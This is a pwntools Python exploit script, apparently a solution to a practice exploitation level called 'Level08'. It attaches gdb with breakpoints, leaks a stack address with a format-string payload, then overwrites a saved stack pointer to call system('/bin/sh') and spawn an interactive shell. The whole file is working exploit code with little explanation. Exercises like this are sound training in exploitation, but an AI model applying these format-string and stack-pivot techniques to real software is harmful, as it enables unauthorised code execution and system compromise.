#!/usr/bin/python3

from pwn import*

exe = ELF('./Level08', checksec=False)
context.binary = exe

p = process(exe.path)

gdb.attach(p, gdbscript='''
b*0x080484fc
b*0x0804851a
b*0x0804852a
b*0x0804853e
c
''')

###################################
### Stage 1: Leak stack address ###
###################################
# Notice it already saved stack to stack so we get this value
payload = b"%9$p"
p.sendline(payload)

p.recvuntil(b'0x')
stack_leak = int(p.recv(8),16)
inp_addr = stack_leak - 0x24
log.info("Stack leak: " + hex(stack_leak))
log.info("Input address: " + hex(inp_addr))

##########################
### Stage 2: Get shell ###
##########################
payload = flat(
    b'A'*8,
    inp_addr + 0x10,    # Overwrite saved stack address ecx

    exe.sym['system'],
    0,                  # Fake return address
    inp_addr + 0x18,    # Arg1, pointing to string "/bin/sh"
    b'/bin/sh\0'
    )
p.sendline(payload)
p.interactive()
